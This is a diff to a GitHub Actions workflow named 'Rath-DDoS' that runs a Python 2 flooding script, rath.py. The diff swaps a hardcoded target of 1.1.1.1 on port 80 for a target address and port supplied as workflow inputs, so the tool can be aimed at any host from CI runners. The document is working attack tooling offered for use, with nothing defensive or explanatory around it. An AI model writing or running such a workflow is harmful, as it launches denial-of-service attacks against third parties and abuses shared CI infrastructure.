@@ -1,4 +1,5 @@
 # https://stackoverflow.com/questions/5656892/inserting-text-in-a-user-prompt-when-executing-a-command-from-shell-bash-scrip
+# https://askubuntu.com/questions/338857/automatically-enter-input-in-command-line
 name: Rath-DDoS
 
 on:
@@ -32,9 +33,7 @@ jobs:
     - name: Running Script
       run: |
        cd Rath-DDoS-master
-       printf "1.1.1.1\n80\n" | python2 rath.py
-#       echo "80\n
-#       expect "Enter Target Ip :"
-#      send "1.1.1.1"
+       printf "${{ github.event.inputs.url }}\n${{ github.event.inputs.port }}\n" | python2 rath.py
+#       printf "1.1.1.1\n80\n" | python2 rath.py
 #       printf "${{ github.event.inputs.url }}"
 #       echo "${{ github.event.inputs.port }}"
